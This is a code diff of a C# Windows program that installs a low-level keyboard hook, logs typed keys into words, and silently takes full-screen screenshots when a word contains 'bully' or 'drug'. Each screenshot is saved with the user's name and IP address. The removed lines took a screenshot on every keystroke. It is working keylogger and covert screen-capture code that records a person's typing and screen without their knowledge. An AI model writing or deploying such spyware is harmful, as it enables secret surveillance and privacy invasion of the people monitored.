@@ -20,12 +20,17 @@ namespace keystroke
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
+        private static string word = "";
+        private static List<string> spy_list = new List<string>();
+
         /// <summary>
         /// The main entry point for the application.
         /// </summary>
         [STAThread]
         static void Main()
         {
+            spy_list.Add("bully");
+            spy_list.Add("drug");
             _hookID = SetHook(_proc);
 
             //Application.EnableVisualStyles();
@@ -60,6 +65,32 @@ namespace keystroke
             throw new Exception("No network adapters with an IPv4 address in the system!");
         }
 
+        private static void takeScreenshot()
+        {
+            Bitmap memoryImage;
+
+            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
+            int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+
+            memoryImage = new Bitmap(screenWidth, screenHeight);
+            Size s = new Size(memoryImage.Width, memoryImage.Height);
+
+            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+
+            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+
+            string urName = System.Environment.UserName;
+            string ipAddr = GetLocalIPAddress();
+            //That's it! Save the image in the directory and this will work like charm.  
+            string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
+                      @"\Screenshot" + "_" + urName + "_" + ipAddr + "_" +
+                      DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
+
+
+            // save it  
+            memoryImage.Save(fileName);
+        }
+
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
@@ -68,27 +99,33 @@ namespace keystroke
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
 
-                Bitmap memoryImage;
+                if (vkCode == 13 || vkCode == 9 || vkCode == 32)
+                {
+                    
+                    bool exist = false;
 
-                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
-                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+                    for (int i = 0; i < spy_list.Count; i++)
+                    {
+                         if (word.ToLower().Contains(spy_list[i].ToLower()))
+                        {
+                            exist = true;
+                            break;
+                        }
+                    }
 
-                memoryImage = new Bitmap(screenWidth, screenHeight);
-                Size s = new Size(memoryImage.Width, memoryImage.Height);
+                    if (exist == true)
+                        takeScreenshot();
+                        
+                    word = "";
+                }
+                else
+                {
+                    char character = (char)vkCode;
+                    word += character.ToString();
+                    Console.WriteLine(word);
+                }
 
-                Graphics memoryGraphics = Graphics.FromImage(memoryImage);
-
-                memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
-
-                string urName = System.Environment.UserName;
-                string ipAddr = GetLocalIPAddress();
-                //That's it! Save the image in the directory and this will work like charm.  
-                string fileName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) +
-                          @"\Screenshot" + "_" + urName + "_" + ipAddr + "_" +
-                          DateTime.Now.ToString("(dd_MMMM_hh_mm_ss_tt)") + ".png");
-
-                // save it  
-                memoryImage.Save(fileName);
+                
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
